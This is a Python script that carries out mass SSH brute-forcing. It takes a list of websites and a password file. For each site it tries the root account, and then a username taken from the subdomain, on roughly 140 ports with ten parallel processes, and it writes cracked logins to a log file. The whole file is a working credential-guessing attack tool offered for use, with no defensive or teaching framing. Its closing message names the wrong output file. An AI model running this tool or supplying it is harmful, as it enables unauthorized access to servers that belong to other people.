import paramiko, colorama, socket, os, sys, platform
from multiprocessing import Pool
from time import time
from colorama import Fore, Style
from platform import system
if system() == 'Linux':
    os.system('clear')
else:
    os.system('cls')
socket.setdefaulttimeout(5)
passwords = open('password.txt').read().splitlines()

print(f"""{Fore.YELLOW}
    ___________      __    _ __ 
   / ____/ ___/_____/ /_  (_) /_
  / /_   \__ \/ ___/ __ \/ / __/
 / __/  ___/ (__  ) / / / / /_  
/_/    /____/____/_/ /_/_/\__/    
{Fore.WHITE}Mass Bruteforce SSH (With root user & auto get username)
""")
listmega = input("Website list: ")
def ssh(host, username, password, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
        print(f'{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}] {host}|{username}|{password}|{port} ->{Fore.GREEN} OK {Fore.WHITE}')
        return (host, username, password, port, True)
    except:
        print(f'{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}] {host}|{username}|{password}|{port} ->{Fore.RED} NO {Fore.WHITE}')
        return (host, username, password, port, False)
def worker(host):
    for port in ports:
        for password in passwords:
            result = ssh(host, 'root', password, port)
            if result[4] == False and '.' in host:
                subdomain = host.split('.')[0]
                result = ssh(host, subdomain, password, port)
            if result[4]:
                with open('success.log', 'a') as f:
                    f.write(f'Host: {result[0]} Username: {result[1]} Password: {result[2]} Port: {result[3]}\n')
lines = open(listmega).read().splitlines()
lines = list(set(lines))
# PORT DISINI, LU BISA CUSTOM SENDIRI SESUAI SELERA xD
ports = [22, 222, 2222, 2200, 8022, 122, 4422, 25, 80, 110, 135, 143, 261, 271, 324, 443, 448, 465, 563, 614, 631, 636, 664, 684, 695, 832, 853, 854, 990, 993, 989, 992, 994, 995, 1129, 1131, 1184, 2083, 2087, 2089, 2096, 2221, 2252, 2376, 2381, 2478, 2479, 2482, 2484, 2679, 2762, 3077, 3078, 3183, 3191, 3220, 3269, 3306, 3410, 3424, 3471, 3496, 3509, 3529, 3539, 3535, 3660, 36611, 3713, 3747, 3766, 3864, 3885, 3995, 3896, 4031, 4036, 4062, 4064, 4081, 4083, 4116, 4335, 4336, 4536, 4590, 4740, 4843, 4849, 5443, 5007, 5061, 5321, 5349, 5671, 5783, 5868, 5986, 5989, 5990, 6209, 6251, 6443, 6513, 6514, 6619, 6697, 6771, 7202, 7443, 7673, 7674, 7677, 7775, 8243, 8443, 8991, 8989, 9089, 9295, 9318, 9443, 9444, 9614, 9802, 10161, 10162, 11751, 12013, 12109, 14143, 15002, 16995, 41230, 16993, 20003]
if __name__ == '__main__':
    pool = Pool(10)
    start = time()
    pool.map(worker, lines)
    print('\nDONE! The successful results of the bruteforce process above are saved in succes.txt')
